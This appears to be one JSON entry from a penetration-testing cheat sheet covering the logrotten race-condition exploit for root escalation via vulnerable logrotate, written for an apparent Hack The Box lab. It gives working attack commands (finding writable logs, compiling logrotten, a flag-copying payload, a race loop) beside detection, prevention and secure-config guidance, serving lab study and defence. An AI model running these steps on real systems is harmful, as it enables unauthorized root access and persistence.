      "id": "logrotate-logrotten",
      "name": "Logrotate - logrotten Exploit",
      "command": "./logrotten -p ./payload <writable_log>",
      "description": "Vulnerable logrotate (3.8.6/3.11.0/3.15.0/3.18.0) run as root on a log you can write lets logrotten win a race to execute a payload as root, typically dropped into /etc/bash_completion.d.",
      "steps": [
        {
          "label": "1. Check version + find writable log",
          "command": "logrotate --version   # 3.11.0 = vulnerable\ncat /etc/logrotate.conf\nfind / -writable -name \"*.log\" 2>/dev/null"
        },
        {
          "label": "2. Build logrotten + payload",
          "command": "git clone https://github.com/whotwagner/logrotten.git; cd logrotten\ngcc -static logrotten.c -o logrotten_static\necho 'cat /root/flag.txt > /home/htb-student/flag.txt && chmod 644 /home/htb-student/flag.txt' > payload"
        },
        {
          "label": "3. Spam the race loop",
          "command": "while true; do echo \"x\" >> /home/htb-student/backups/access.log 2>/dev/null; timeout 6 ./logrotten -p ./payload /home/htb-student/backups/access.log 2>/dev/null; sleep 1; done"
        }
      ],
      "opsec": "loud",
      "mitre": [
        "T1068"
      ],
      "exam": "exam-ok",
      "defense": {
        "why_it_works": "logrotten exploits a TOCTOU race condition in logrotate's 'create' directive. When logrotate renames a log file before creating a new one, logrotten uses inotify to detect the rename and replaces the log directory with a symlink to /etc/bash_completion.d. Logrotate then creates the new log file at the symlink target, giving root ownership. The attacker's payload in that file is executed when root next opens a bash login shell.",
        "prerequisites": "A log file writable by the attacker. logrotate running as root (via cron). logrotate configured with the 'create' directive (not 'copytruncate'). Vulnerable logrotate versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0.",
        "impact": "Code execution as root when root next logs in via bash. Attacker can read /root/flag.txt, add sudoers entries, install backdoors, or achieve persistent root access.",
        "detection": "inotify watch on log directories (unusual). Unexpected creation of files in /etc/bash_completion.d by logrotate process. File integrity monitoring on /etc/bash_completion.d. auditd: write to /etc/bash_completion.d by non-root.",
        "artifacts": "File integrity alert (/etc/bash_completion.d/ modified) | Auditd: logrotate creating file in unexpected path | Payload execution in bash audit log",
        "prevention": "Update logrotate to a patched version. Use 'copytruncate' instead of 'create' in logrotate configs for attacker-writable log files. Ensure logrotate-handled log directories are not writable by low-privileged users. Apply SELinux policy to restrict logrotate's file creation scope.",
        "misconfiguration": "Attacker-writable log file (/home/htb-student/backups/access.log) processed by root-run logrotate with the 'create' directive. logrotate version 3.11.0 (vulnerable to race condition).",
        "vulnerable_config": "# Vulnerable logrotate config\n/home/htb-student/backups/access.log {\n  missingok\n  daily\n  create  # <-- vulnerable directive (use copytruncate instead)\n  rotate 7\n}\n\n# logrotate version\nlogrotate --version\n# logrotate 3.11.0  <- vulnerable",
        "secure_config": "# Use copytruncate to avoid race condition\n/home/htb-student/backups/access.log {\n  missingok\n  daily\n  copytruncate  # copies then truncates -- no rename race\n  rotate 7\n}\n\n# Ensure log files not writable by non-root\nchown root:root /home/htb-student/backups/access.log\nchmod 640 /home/htb-student/backups/access.log\n\n# Update logrotate\napt install --only-upgrade logrotate",
        "evasion": "Race window is tiny -- loop logrotten continuously to win the race. Use inotify-based triggering (built into logrotten) for reliable exploitation.",
        "sources": [
          "HTB M25",
          "MITRE T1053.003",
          "MITRE T1574"
        ]
      },
      "variations": [
        {
          "label": "Clone and compile logrotten if binary not available",
          "command": "git clone https://github.com/whotwagner/logrotten.git\ncd logrotten && gcc logrotten.c -o logrotten"
        }
      ]
